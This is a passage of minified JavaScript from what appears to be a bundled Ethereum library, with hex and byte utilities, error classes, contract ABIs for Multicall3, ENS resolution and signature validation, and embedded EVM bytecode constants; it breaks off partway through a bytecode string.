
function Ea(e) {
    const t = e.toString(16);
    return t.length & 1 ? "0" + t : t
}

function mg(e) {
    if (typeof e != "string") throw new Error("hex string expected, got " + typeof e);
    return e === "" ? td : BigInt("0x" + e)
}
const bg = typeof Uint8Array.from([]).toHex == "function" && typeof Uint8Array.fromHex == "function",
    mv = Array.from({
        length: 256
    }, (e, t) => t.toString(16).padStart(2, "0"));

function No(e) {
    if (nd(e), bg) return e.toHex();
    let t = "";
    for (let n = 0; n < e.length; n++) t += mv[e[n]];
    return t
}
const Tn = {
    _0: 48,
    _9: 57,
    A: 65,
    F: 70,
    a: 97,
    f: 102
};

function fp(e) {
    if (e >= Tn._0 && e <= Tn._9) return e - Tn._0;
    if (e >= Tn.A && e <= Tn.F) return e - (Tn.A - 10);
    if (e >= Tn.a && e <= Tn.f) return e - (Tn.a - 10)
}

function dc(e) {
    if (typeof e != "string") throw new Error("hex string expected, got " + typeof e);
    if (bg) return Uint8Array.fromHex(e);
    const t = e.length,
        n = t / 2;
    if (t % 2) throw new Error("hex string expected, got unpadded hex of length " + t);
    const r = new Uint8Array(n);
    for (let s = 0, i = 0; s < n; s++, i += 2) {
        const o = fp(e.charCodeAt(i)),
            a = fp(e.charCodeAt(i + 1));
        if (o === void 0 || a === void 0) {
            const c = e[i] + e[i + 1];
            throw new Error('hex string expected, got non-hex character "' + c + '" at index ' + i)
        }
        r[s] = o * 16 + a
    }
    return r
}

function Zr(e) {
    return mg(No(e))
}

function gg(e) {
    return nd(e), mg(No(Uint8Array.from(e).reverse()))
}

function sa(e, t) {
    return dc(e.toString(16).padStart(t * 2, "0"))
}

function xg(e, t) {
    return sa(e, t).reverse()
}

function Ut(e, t, n) {
    let r;
    if (typeof t == "string") try {
            r = dc(t)
        } catch (i) {
            throw new Error(e + " must be hex string or Uint8Array, cause: " + i)
        } else if (ra(t)) r = Uint8Array.from(t);
        else throw new Error(e + " must be hex string or Uint8Array");
    const s = r.length;
    if (typeof n == "number" && s !== n) throw new Error(e + " of length " + n + " expected, got " + s);
    return r
}

function hc(...e) {
    let t = 0;
    for (let r = 0; r < e.length; r++) {
        const s = e[r];
        nd(s), t += s.length
    }
    const n = new Uint8Array(t);
    for (let r = 0, s = 0; r < e.length; r++) {
        const i = e[r];
        n.set(i, s), s += i.length
    }
    return n
}
const Jl = e => typeof e == "bigint" && td <= e;

function rd(e, t, n) {
    return Jl(e) && Jl(t) && Jl(n) && t <= e && e < n
}

function $s(e, t, n, r) {
    if (!rd(t, n, r)) throw new Error("expected valid " + e + ": " + n + " <= n < " + r + ", got " + t)
}

function bv(e) {
    let t;
    for (t = 0; e > td; e >>= n0, t += 1);
    return t
}
const gl = e => (n0 << BigInt(e)) - n0,
    Ql = e => new Uint8Array(e),
    dp = e => Uint8Array.from(e);

function gv(e, t, n) {
    if (typeof e != "number" || e < 2) throw new Error("hashLen must be a number");
    if (typeof t != "number" || t < 2) throw new Error("qByteLen must be a number");
    if (typeof n != "function") throw new Error("hmacFn must be a function");
    let r = Ql(e),
        s = Ql(e),
        i = 0;
    const o = () => {
            r.fill(1), s.fill(0), i = 0
        },
        a = (...f) => n(s, r, ...f),
        c = (f = Ql(0)) => {
            s = a(dp([0]), f), r = a(), f.length !== 0 && (s = a(dp([1]), f), r = a())
        },
        u = () => {
            if (i++ >= 1e3) throw new Error("drbg: tried 1000 values");
            let f = 0;
            const d = [];
            for (; f < t;) {
                r = a();
                const h = r.slice();
                d.push(h), f += r.length
            }
            return hc(...d)
        };
    return (f, d) => {
        o(), c(f);
        let h;
        for (; !(h = d(u()));) c();
        return o(), h
    }
}
const xv = {
    bigint: e => typeof e == "bigint",
    function: e => typeof e == "function",
    boolean: e => typeof e == "boolean",
    string: e => typeof e == "string",
    stringOrUint8Array: e => typeof e == "string" || ra(e),
    isSafeInteger: e => Number.isSafeInteger(e),
    array: e => Array.isArray(e),
    field: (e, t) => t.Fp.isValid(e),
    hash: e => typeof e == "function" && Number.isSafeInteger(e.outputLen)
};

function xl(e, t, n = {}) {
    const r = (s, i, o) => {
        const a = xv[i];
        if (typeof a != "function") throw new Error("invalid validator function");
        const c = e[s];
        if (!(o && c === void 0) && !a(c, e)) throw new Error("param " + String(s) + " is invalid. Expected " + i + ", got " + c)
    };
    for (const [s, i] of Object.entries(t)) r(s, i, !1);
    for (const [s, i] of Object.entries(n)) r(s, i, !0);
    return e
}

function hp(e) {
    const t = new WeakMap;
    return (n, ...r) => {
        const s = t.get(n);
        if (s !== void 0) return s;
        const i = e(n, ...r);
        return t.set(n, i), i
    }
}
const yv = "0.1.1";

function wv() {
    return yv
}
class ce extends Error {
    constructor(t, n = {}) {
        const r = (() => {
                if (n.cause instanceof ce) {
                    if (n.cause.details) return n.cause.details;
                    if (n.cause.shortMessage) return n.cause.shortMessage
                }
                return n.cause && "details" in n.cause && typeof n.cause.details == "string" ? n.cause.details : n.cause?.message ? n.cause.message : n.details
            })(),
            s = n.cause instanceof ce && n.cause.docsPath || n.docsPath,
            o = `https://oxlib.sh${s??""}`,
            a = [t || "An error occurred.", ...n.metaMessages ? ["", ...n.metaMessages] : [], ...r || s ? ["", r ? `Details: ${r}` : void 0, s ? `See: ${o}` : void 0] : []].filter(c => typeof c == "string").join(`
`);
        super(a, n.cause ? {
            cause: n.cause
        } : void 0), Object.defineProperty(this, "details", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "docs", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "docsPath", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "shortMessage", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "cause", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "BaseError"
        }), Object.defineProperty(this, "version", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: `ox@${wv()}`
        }), this.cause = n.cause, this.details = r, this.docs = o, this.docsPath = s, this.shortMessage = t
    }
    walk(t) {
        return yg(this, t)
    }
}

function yg(e, t) {
    return t?.(e) ? e : e && typeof e == "object" && "cause" in e && e.cause ? yg(e.cause, t) : t ? null : e
}

function ia(e, t) {
    if (Is(e) > t) throw new $v({
        givenSize: Is(e),
        maxSize: t
    })
}
const Sn = {
    zero: 48,
    nine: 57,
    A: 65,
    F: 70,
    a: 97,
    f: 102
};

function pp(e) {
    if (e >= Sn.zero && e <= Sn.nine) return e - Sn.zero;
    if (e >= Sn.A && e <= Sn.F) return e - (Sn.A - 10);
    if (e >= Sn.a && e <= Sn.f) return e - (Sn.a - 10)
}

function _v(e, t = {}) {
    const {
        dir: n,
        size: r = 32
    } = t;
    if (r === 0) return e;
    if (e.length > r) throw new Dv({
        size: e.length,
        targetSize: r,
        type: "Bytes"
    });
    const s = new Uint8Array(r);
    for (let i = 0; i < r; i++) {
        const o = n === "right";
        s[o ? i : r - i - 1] = e[o ? i : e.length - i - 1]
    }
    return s
}

function wg(e, t = {}) {
    const {
        dir: n = "left"
    } = t;
    let r = e,
        s = 0;
    for (let i = 0; i < r.length - 1 && r[n === "left" ? i : r.length - i - 1].toString() === "0"; i++) s++;
    return r = n === "left" ? r.slice(s) : r.slice(0, r.length - s), r
}

function yl(e, t) {
    if (kt(e) > t) throw new zv({
        givenSize: kt(e),
        maxSize: t
    })
}

function Ev(e, t) {
    if (typeof t == "number" && t > 0 && t > kt(e) - 1) throw new Ng({
        offset: t,
        position: "start",
        size: kt(e)
    })
}

function vv(e, t, n) {
    if (typeof t == "number" && typeof n == "number" && kt(e) !== n - t) throw new Ng({
        offset: n,
        position: "end",
        size: kt(e)
    })
}

function _g(e, t = {}) {
    const {
        dir: n,
        size: r = 32
    } = t;
    if (r === 0) return e;
    const s = e.replace("0x", "");
    if (s.length > r * 2) throw new qv({
        size: Math.ceil(s.length / 2),
        targetSize: r,
        type: "Hex"
    });
    return `0x${s[n==="right"?"padEnd":"padStart"](r*2,"0")}`
}
const Tv = "#__bigint";

function Eg(e, t, n) {
    return JSON.stringify(e, (r, s) => typeof s == "bigint" ? s.toString() + Tv : s, n)
}
const Sv = new TextDecoder,
    Cv = new TextEncoder;

function Iv(e) {
    return e instanceof Uint8Array ? e : typeof e == "string" ? vg(e) : Av(e)
}

function Av(e) {
    return e instanceof Uint8Array ? e : new Uint8Array(e)
}

function vg(e, t = {}) {
    const {
        size: n
    } = t;
    let r = e;
    n && (yl(e, n), r = cs(e, n));
    let s = r.slice(2);
    s.length % 2 && (s = `0${s}`);
    const i = s.length / 2,
        o = new Uint8Array(i);
    for (let a = 0, c = 0; a < i; a++) {
        const u = pp(s.charCodeAt(c++)),
            l = pp(s.charCodeAt(c++));
        if (u === void 0 || l === void 0) throw new ce(`Invalid byte sequence ("${s[c-2]}${s[c-1]}" in "${s}").`);
        o[a] = u * 16 + l
    }
    return o
}

function Nv(e, t = {}) {
    const {
        size: n
    } = t, r = Cv.encode(e);
    return typeof n == "number" ? (ia(r, n), Pv(r, n)) : r
}

function Pv(e, t) {
    return _v(e, {
        dir: "right",
        size: t
    })
}

function Is(e) {
    return e.length
}

function Ov(e, t, n, r = {}) {
    const {
        strict: s
    } = r;
    return e.slice(t, n)
}

function Rv(e, t = {}) {
    const {
        size: n
    } = t;
    typeof n < "u" && ia(e, n);
    const r = tn(e, t);
    return Cg(r, t)
}

function Mv(e, t = {}) {
    const {
        size: n
    } = t;
    let r = e;
    if (typeof n < "u" && (ia(r, n), r = Tg(r)), r.length > 1 || r[0] > 1) throw new Lv(r);
    return !!r[0]
}

function Vn(e, t = {}) {
    const {
        size: n
    } = t;
    typeof n < "u" && ia(e, n);
    const r = tn(e, t);
    return Ig(r, t)
}

function kv(e, t = {}) {
    const {
        size: n
    } = t;
    let r = e;
    return typeof n < "u" && (ia(r, n), r = Bv(r)), Sv.decode(r)
}

function Tg(e) {
    return wg(e, {
        dir: "left"
    })
}

function Bv(e) {
    return wg(e, {
        dir: "right"
    })
}
class Lv extends ce {
    constructor(t) {
        super(`Bytes value \`${t}\` is not a valid boolean.`, {
            metaMessages: ["The bytes array must contain a single byte of either a `0` or `1` value."]
        }), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "Bytes.InvalidBytesBooleanError"
        })
    }
}
let $v = class extends ce {
        constructor({
            givenSize: t,
            maxSize: n
        }) {
            super(`Size cannot exceed \`${n}\` bytes. Given size: \`${t}\` bytes.`), Object.defineProperty(this, "name", {
                enumerable: !0,
                configurable: !0,
                writable: !0,
                value: "Bytes.SizeOverflowError"
            })
        }
    },
    Dv = class extends ce {
        constructor({
            size: t,
            targetSize: n,
            type: r
        }) {
            super(`${r.charAt(0).toUpperCase()}${r.slice(1).toLowerCase()} size (\`${t}\`) exceeds padding size (\`${n}\`).`), Object.defineProperty(this, "name", {
                enumerable: !0,
                configurable: !0,
                writable: !0,
                value: "Bytes.SizeExceedsPaddingSizeError"
            })
        }
    };
const Fv = new TextEncoder,
    Uv = Array.from({
        length: 256
    }, (e, t) => t.toString(16).padStart(2, "0"));

function Vv(e, t = {}) {
    const {
        strict: n = !1
    } = t;
    if (!e) throw new mp(e);
    if (typeof e != "string") throw new mp(e);
    if (n && !/^0x[0-9a-fA-F]*$/.test(e)) throw new bp(e);
    if (!e.startsWith("0x")) throw new bp(e)
}

function en(...e) {
    return `0x${e.reduce((t,n)=>t+n.replace("0x",""),"")}`
}

function Hv(e) {
    return e instanceof Uint8Array ? tn(e) : Array.isArray(e) ? tn(new Uint8Array(e)) : e
}

function Sg(e, t = {}) {
    const n = `0x${Number(e)}`;
    return typeof t.size == "number" ? (yl(n, t.size), as(n, t.size)) : n
}

function tn(e, t = {}) {
    let n = "";
    for (let s = 0; s < e.length; s++) n += Uv[e[s]];
    const r = `0x${n}`;
    return typeof t.size == "number" ? (yl(r, t.size), cs(r, t.size)) : r
}

function ct(e, t = {}) {
    const {
        signed: n,
        size: r
    } = t, s = BigInt(e);
    let i;
    r ? n ? i = (1n << BigInt(r) * 8n - 1n) - 1n : i = 2n ** (BigInt(r) * 8n) - 1n : typeof e == "number" && (i = BigInt(Number.MAX_SAFE_INTEGER));
    const o = typeof i == "bigint" && n ? -i - 1n : 0;
    if (i && s > i || s < o) {
        const u = typeof e == "bigint" ? "n" : "";
        throw new Ag({
            max: i ? `${i}${u}` : void 0,
            min: `${o}${u}`,
            signed: n,
            size: r,
            value: `${e}${u}`
        })
    }
    const c = `0x${(n&&s<0?(1n<<BigInt(r*8))+BigInt(s):s).toString(16)}`;
    return r ? as(c, r) : c
}

function sd(e, t = {}) {
    return tn(Fv.encode(e), t)
}

function as(e, t) {
    return _g(e, {
        dir: "left",
        size: t
    })
}

function cs(e, t) {
    return _g(e, {
        dir: "right",
        size: t
    })
}

function hn(e, t, n, r = {}) {
    const {
        strict: s
    } = r;
    Ev(e, t);
    const i = `0x${e.replace("0x","").slice((t??0)*2,(n??e.length)*2)}`;
    return s && vv(i, t, n), i
}

function kt(e) {
    return Math.ceil((e.length - 2) / 2)
}

function Cg(e, t = {}) {
    const {
        signed: n
    } = t;
    t.size && yl(e, t.size);
    const r = BigInt(e);
    if (!n) return r;
    const s = (e.length - 2) / 2,
        i = (1n << BigInt(s) * 8n) - 1n,
        o = i >> 1n;
    return r <= o ? r : r - i - 1n
}

function Ig(e, t = {}) {
    const {
        signed: n,
        size: r
    } = t;
    return Number(!n && !r ? e : Cg(e, t))
}

function jv(e, t = {}) {
    const {
        strict: n = !1
    } = t;
    try {
        return Vv(e, {
            strict: n
        }), !0
    } catch {
        return !1
    }
}
class Ag extends ce {
    constructor({
        max: t,
        min: n,
        signed: r,
        size: s,
        value: i
    }) {
        super(`Number \`${i}\` is not in safe${s?` ${s*8}-bit`:""}${r?" signed":" unsigned"} integer range ${t?`(\`${n}\` to \`${t}\`)`:`(above \`${n}\`)`}`), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "Hex.IntegerOutOfRangeError"
        })
    }
}
class mp extends ce {
    constructor(t) {
        super(`Value \`${typeof t=="object"?Eg(t):t}\` of type \`${typeof t}\` is an invalid hex type.`, {
            metaMessages: ['Hex types must be represented as `"0x${string}"`.']
        }), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "Hex.InvalidHexTypeError"
        })
    }
}
class bp extends ce {
    constructor(t) {
        super(`Value \`${t}\` is an invalid hex value.`, {
            metaMessages: ['Hex values must start with `"0x"` and contain only hexadecimal characters (0-9, a-f, A-F).']
        }), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "Hex.InvalidHexValueError"
        })
    }
}
class zv extends ce {
    constructor({
        givenSize: t,
        maxSize: n
    }) {
        super(`Size cannot exceed \`${n}\` bytes. Given size: \`${t}\` bytes.`), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "Hex.SizeOverflowError"
        })
    }
}
class Ng extends ce {
    constructor({
        offset: t,
        position: n,
        size: r
    }) {
        super(`Slice ${n==="start"?"starting":"ending"} at offset \`${t}\` is out-of-bounds (size: \`${r}\`).`), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "Hex.SliceOffsetOutOfBoundsError"
        })
    }
}
class qv extends ce {
    constructor({
        size: t,
        targetSize: n,
        type: r
    }) {
        super(`${r.charAt(0).toUpperCase()}${r.slice(1).toLowerCase()} size (\`${t}\`) exceeds padding size (\`${n}\`).`), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "Hex.SizeExceedsPaddingSizeError"
        })
    }
}

function Gv(e) {
    return {
        address: e.address,
        amount: ct(e.amount),
        index: ct(e.index),
        validatorIndex: ct(e.validatorIndex)
    }
}

function Pg(e) {
    return {
        ...typeof e.baseFeePerGas == "bigint" && {
            baseFeePerGas: ct(e.baseFeePerGas)
        },
        ...typeof e.blobBaseFee == "bigint" && {
            blobBaseFee: ct(e.blobBaseFee)
        },
        ...typeof e.feeRecipient == "string" && {
            feeRecipient: e.feeRecipient
        },
        ...typeof e.gasLimit == "bigint" && {
            gasLimit: ct(e.gasLimit)
        },
        ...typeof e.number == "bigint" && {
            number: ct(e.number)
        },
        ...typeof e.prevRandao == "bigint" && {
            prevRandao: ct(e.prevRandao)
        },
        ...typeof e.time == "bigint" && {
            time: ct(e.time)
        },
        ...e.withdrawals && {
            withdrawals: e.withdrawals.map(Gv)
        }
    }
}
const pc = [{
        inputs: [{
            components: [{
                name: "target",
                type: "address"
            }, {
                name: "allowFailure",
                type: "bool"
            }, {
                name: "callData",
                type: "bytes"
            }],
            name: "calls",
            type: "tuple[]"
        }],
        name: "aggregate3",
        outputs: [{
            components: [{
                name: "success",
                type: "bool"
            }, {
                name: "returnData",
                type: "bytes"
            }],
            name: "returnData",
            type: "tuple[]"
        }],
        stateMutability: "view",
        type: "function"
    }, {
        inputs: [],
        name: "getCurrentBlockTimestamp",
        outputs: [{
            internalType: "uint256",
            name: "timestamp",
            type: "uint256"
        }],
        stateMutability: "view",
        type: "function"
    }],
    r0 = [{
        name: "query",
        type: "function",
        stateMutability: "view",
        inputs: [{
            type: "tuple[]",
            name: "queries",
            components: [{
                type: "address",
                name: "sender"
            }, {
                type: "string[]",
                name: "urls"
            }, {
                type: "bytes",
                name: "data"
            }]
        }],
        outputs: [{
            type: "bool[]",
            name: "failures"
        }, {
            type: "bytes[]",
            name: "responses"
        }]
    }, {
        name: "HttpError",
        type: "error",
        inputs: [{
            type: "uint16",
            name: "status"
        }, {
            type: "string",
            name: "message"
        }]
    }],
    Og = [{
        inputs: [{
            name: "dns",
            type: "bytes"
        }],
        name: "DNSDecodingFailed",
        type: "error"
    }, {
        inputs: [{
            name: "ens",
            type: "string"
        }],
        name: "DNSEncodingFailed",
        type: "error"
    }, {
        inputs: [],
        name: "EmptyAddress",
        type: "error"
    }, {
        inputs: [{
            name: "status",
            type: "uint16"
        }, {
            name: "message",
            type: "string"
        }],
        name: "HttpError",
        type: "error"
    }, {
        inputs: [],
        name: "InvalidBatchGatewayResponse",
        type: "error"
    }, {
        inputs: [{
            name: "errorData",
            type: "bytes"
        }],
        name: "ResolverError",
        type: "error"
    }, {
        inputs: [{
            name: "name",
            type: "bytes"
        }, {
            name: "resolver",
            type: "address"
        }],
        name: "ResolverNotContract",
        type: "error"
    }, {
        inputs: [{
            name: "name",
            type: "bytes"
        }],
        name: "ResolverNotFound",
        type: "error"
    }, {
        inputs: [{
            name: "primary",
            type: "string"
        }, {
            name: "primaryAddress",
            type: "bytes"
        }],
        name: "ReverseAddressMismatch",
        type: "error"
    }, {
        inputs: [{
            internalType: "bytes4",
            name: "selector",
            type: "bytes4"
        }],
        name: "UnsupportedResolverProfile",
        type: "error"
    }],
    Rg = [...Og, {
        name: "resolveWithGateways",
        type: "function",
        stateMutability: "view",
        inputs: [{
            name: "name",
            type: "bytes"
        }, {
            name: "data",
            type: "bytes"
        }, {
            name: "gateways",
            type: "string[]"
        }],
        outputs: [{
            name: "",
            type: "bytes"
        }, {
            name: "address",
            type: "address"
        }]
    }],
    Wv = [...Og, {
        name: "reverseWithGateways",
        type: "function",
        stateMutability: "view",
        inputs: [{
            type: "bytes",
            name: "reverseName"
        }, {
            type: "uint256",
            name: "coinType"
        }, {
            type: "string[]",
            name: "gateways"
        }],
        outputs: [{
            type: "string",
            name: "resolvedName"
        }, {
            type: "address",
            name: "resolver"
        }, {
            type: "address",
            name: "reverseResolver"
        }]
    }],
    gp = [{
        name: "text",
        type: "function",
        stateMutability: "view",
        inputs: [{
            name: "name",
            type: "bytes32"
        }, {
            name: "key",
            type: "string"
        }],
        outputs: [{
            name: "",
            type: "string"
        }]
    }],
    xp = [{
        name: "addr",
        type: "function",
        stateMutability: "view",
        inputs: [{
            name: "name",
            type: "bytes32"
        }],
        outputs: [{
            name: "",
            type: "address"
        }]
    }, {
        name: "addr",
        type: "function",
        stateMutability: "view",
        inputs: [{
            name: "name",
            type: "bytes32"
        }, {
            name: "coinType",
            type: "uint256"
        }],
        outputs: [{
            name: "",
            type: "bytes"
        }]
    }],
    Mg = [{
        name: "isValidSignature",
        type: "function",
        stateMutability: "view",
        inputs: [{
            name: "hash",
            type: "bytes32"
        }, {
            name: "signature",
            type: "bytes"
        }],
        outputs: [{
            name: "",
            type: "bytes4"
        }]
    }],
    yp = [{
        inputs: [{
            name: "_signer",
            type: "address"
        }, {
            name: "_hash",
            type: "bytes32"
        }, {
            name: "_signature",
            type: "bytes"
        }],
        stateMutability: "nonpayable",
        type: "constructor"
    }, {
        inputs: [{
            name: "_signer",
            type: "address"
        }, {
            name: "_hash",
            type: "bytes32"
        }, {
            name: "_signature",
            type: "bytes"
        }],
        outputs: [{
            type: "bool"
        }],
        stateMutability: "nonpayable",
        type: "function",
        name: "isValidSig"
    }],
    Xv = "0x82ad56cb",
    kg = "0x608060405234801561001057600080fd5b5060405161018e38038061018e83398101604081905261002f91610124565b6000808351602085016000f59050803b61004857600080fd5b6000808351602085016000855af16040513d6000823e81610067573d81fd5b3d81f35b634e487b7160e01b600052604160045260246000fd5b600082601f83011261009257600080fd5b81516001600160401b038111156100ab576100ab61006b565b604051601f8201601f19908116603f011681016001600160401b03811182821017156100d9576100d961006b565b6040528181528382016020018510156100f157600080fd5b60005b82811015610110576020818601810151838301820152016100f4565b506000918101602001919091529392505050565b6000806040838503121561013757600080fd5b82516001600160401b0381111561014d57600080fd5b61015985828601610081565b602085015190935090506001600160401b0381111561017757600080fd5b61018385828601610081565b915050925092905056fe",
    Kv = "0x608060405234801561001057600080fd5b506040516102c03803806102c083398101604081905261002f916101e6565b836001600160a01b03163b6000036100e457600080836001600160a01b03168360405161005c9190610270565b6000604051808303816000865af19150503d8060008114610099576040519150601f19603f3d011682016040523d82523d6000602084013e61009e565b606091505b50915091508115806100b857506001600160a01b0386163b155b156100e1578060405163101bb98d60e01b81526004016100d8919061028c565b60405180910390fd5b50505b6000808451602086016000885af16040513d6000823e81610103573d81fd5b3d81f35b80516001600160a01b038116811461011e57600080fd5b919050565b634e487b7160e01b600052604160045260246000fd5b60005b8381101561015457818101518382015260200161013c565b50506000910152565b600082601f83011261016e57600080fd5b81516001600160401b0381111561018757610187610123565b604051601f8201601f19908116603f011681016001600160401b03811182821017156101b5576101b5610123565b6040528181528382016020018510156101cd57600080fd5b6101de826020830160208701610139565b949350505050565b600080600080608085870312156101fc57600080fd5b61020585610107565b60208601519094506001600160401b0381111561022157600080fd5b61022d8782880161015d565b93505061023c60408601610107565b60608601519092506001600160401b0381111561025857600080fd5b6102648782880161015d565b91505092959194509250565b60008251610282818460208701610139565b9190910192915050565b60208152600082518060208401526102ab816040850160208701610139565b601f01601f1916919091016040019291505056fe",
    Zv = "0x608060405234801561001057600080fd5b5060405161069438038061069483398101604081905261002f9161051e565b600061003c848484610048565b9050806000526001601ff35b60007f64926492649264926492649264926492649264926492649264926492649264926100748361040c565b036101e7576000606080848060200190518101906100929190610577565b60405192955090935091506000906001600160a01b038516906100b69085906105dd565b6000604051808303816000865af19150503d80600081146100f3576040519150601f19603f3d011682016040523d82523d6000602084013e6100f8565b606091505b50509050876001600160a01b03163b60000361016057806101605760405162461bcd60e51b815260206004820152601e60248201527f5369676e617475726556616c696461746f723a206465706c6f796d656e74000060448201526064015b60405180910390fd5b604051630b135d3f60e11b808252906001600160a01b038a1690631626ba7e90610190908b9087906004016105f9565b602060405180830381865afa1580156101ad573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101d19190610633565b6001600160e01b03191614945050505050610405565b6001600160a01b0384163b1561027a57604051630b135d3f60e11b808252906001600160a01b03861690631626ba7e9061022790879087906004016105f9565b602060405180830381865afa158015610244573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102689190610633565b6001600160e01b031916149050610405565b81516041146102df5760405162461bcd60e51b815260206004820152603a602482015260008051602061067483398151915260448201527f3a20696e76616c6964207369676e6174757265206c656e6774680000000000006064820152608401610157565b6102e7610425565b5060208201516040808401518451859392600091859190811061030c5761030c61065d565b016020015160f81c9050601b811480159061032b57508060ff16601c14155b1561038c5760405162461bcd60e51b815260206004820152603b602482015260008051602061067483398151915260448201527f3a20696e76616c6964207369676e617475726520762076616c756500000000006064820152608401610157565b60408051600081526020810180835289905260ff83169181019190915260608101849052608081018390526001600160a01b0389169060019060a0016020604051602081039080840390855afa1580156103ea573d6000803e3d6000fd5b505050602060405103516001600160a01b0316149450505050505b9392505050565b600060208251101561041d57600080fd5b508051015190565b60405180606001604052806003906020820280368337509192915050565b6001600160a01b038116811461045857600080fd5b50565b634e487b7160e01b600052604160045260246000fd5b60005b8381101561048c578181015183820152602001610474565b50506000910152565b600082601f8301126104a657600080fd5b81516001600160401b038111156104bf576104bf61045b565b604051601f8201601f19908116603f011681016001600160401b03811182821017156104ed576104ed61045b565b60405281815283820160200185101561050557600080fd5b610516826020830160208701610471565b949350505050565b60008060006060848603121561053357600080fd5b835161053e81610443565b6020850151604086015191945092506001600160401b0381111561056157600080fd5b61056d86828701610495565b9150509250925092565b60008060006060848603121561058c57600080fd5b835161059781610443565b60208501519093506001600160401b038111156105b357600080fd5b6105bf86828701610495565b604086015190935090506001600160401b0381111561056157600080fd5b600082516105ef818460208701610471565b9190910192915050565b828152604060208201526000825180604084015261061e816060850160208701610471565b601f01601f1916919091016060019392505050565b60006020828403121561064557600080fd5b81516001600160e01b03198116811461040557600080fd5b634e487b7160e01b600052603260045260246000fdfe5369676e617475726556616c696461746f72237265636f7665725369676e6572",
    id = "0x608060405234801561001057600080fd5b506115b9806100206000396000f3fe6080604052600436106100f35760003560e01c80634d2301cc1161008a578063a8b0574e11610059578063a8b0574e14610325578063bce38bd714610350578063c3077fa914610380578063ee82ac5e146103b2576100f3565b80634d2301cc1461026257806372425d9d1461029f57806382ad56cb146102ca57806386d516e8146102fa576100f3565b80633408e470116100c65780633408e470146101af578063399542e9146101da5780633e64a6961461020c57806342cbb15c14610237576100f3565b80630f28c97d146100f8578063174dea7114610123578063252dba421461015357806327e86d6e14610184575b600080fd5b34801561010457600080fd5b5061010d6103ef565b60405161011a9190610c0a565b60405180910390f35b61013d60048036038101906101389190610c94565b6103f7565b60405161014a9190610e94565b60405180910390f35b61016d60048036038101906101689190610f0c565b610615565b60405161017b92919061101b565b60405180910390f35b34801561019057600080fd5b506101996107ab565b6040516101a69190611064565b60405180910390f35b3480156101bb57600080fd5b506101c46107b7565b6040516101d19190610c0a565b60405180910390f35b6101f460048036038101906101ef91906110ab565b6107bf565b6040516102039392919061110b565b60405180910390f35b34801561021857600080fd5b506102216107e1565b60405161022e9190610c0a565b60405180910390f35b34801561024357600080fd5b5061024c6107e9565b6040516102599190610c0a565b60405180910390f35b34801561026e57600080fd5b50610289600480360381019061028491906111a7565b6107f1565b6040516102969190610c0a565b60405180910390f35b3480156102ab57600080fd5b506102b4610812565b6040516102c19190610c0a565b60405180910390f35b6102e460048036038101906102df919061122a565b61081a565b6040516102f19190610e94565b60405180910390f35b34801561030657600080fd5b5061030f6109e4565b60405161031c9190610c0a565b60405180910390f35b34801561033157600080fd5b5061033a6109ec565b6040516103479190611286565b60405180910390f35b61036a600480360381019061036591906110ab565b6109f4565b6040516103779190610e94565b60405180910390f35b61039a60048036038101906103959190610f0c565b610ba6565b6040516103a99392919061110b565b60405180910390f35b3480156103be57600080fd5b506103d960048036038101906103d491906112cd565b610bca565b6040516103e69190611064565b60405180910390f35b600042905090565b60606000808484905090508067ffffffffffffffff81111561041c5761041b6112fa565b5b60405190808252806020026020018201604052801561045557816020015b610442610bd5565b81526020019060019003908161043a5790505b5092503660005b828110156105c957600085828151811061047957610478611329565b5b6020026020010151905087878381811061049657610495611329565b5b90506020028101906104a89190611367565b925060008360400135905080860195508360000160208101906104cb91906111a7565b73ffffffffffffffffffffffffffffffffffffffff16818580606001906104f2919061138f565b604051610500929190611431565b60006040518083038185875af1925050503d806000811461053d576040519150601f19603f3d011682016040523d82523d6000602084013e610542565b606091505b5083600001846020018290528215151515815250505081516020850135176105bc577f08c379a000000000000000000000000000000000000000000000000000000000600052602060045260176024527f4d756c746963616c6c333a2063616c6c206661696c656400000000000000000060445260846000fd5b826001019250505061045c565b5082341461060c576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610603906114a7565b60405180910390fd5b50505092915050565b6000606043915060008484905090508067ffffffffffffffff81111561063e5761063d6112fa565b5b60405190808252806020026020018201604052801561067157816020015b606081526020019060019003908161065c5790505b5091503660005b828110156107a157600087878381811061069557610694611329565b5b90506020028101906106a791906114c7565b92508260000160208101906106bc91906111a7565b73ffffffffffffffffffffffffffffffffffffffff168380602001906106e2919061138f565b6040516106f0929190611431565b6000604051808303816000865af19150503d806000811461072d576040519150601f19603f3d011682016040523d82523d6000602084013e610732565b606091505b5086848151811061074657610745611329565b5b60200260200101819052819250505080610795576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161078c9061153b565b60405180910390fd5b81600101915050610678565b5050509250929050565b60006001430340905090565b600046905090565b6000806060439250434091506107d68686866109f4565b905093509350939050565b600048905090565b600043905090565b60008173ffffffffffffffffffffffffffffffffffffffff16319050919050565b600044905090565b606060008383905090508067ffffffffffffffff81111561083e5761083d6112fa565b5b60405190808252806020026020018201604052801561087757816020015b610864610bd5565b81526020019060019003908161085c5790505b5091503660005b828110156109db57600084828151811061089b5761089a611329565b5b602002602001015190508686838181106108b8576108b7611329565b5b90506020028101906108ca919061155b565b92508260000160208101906108df91906111a7565b73fffffff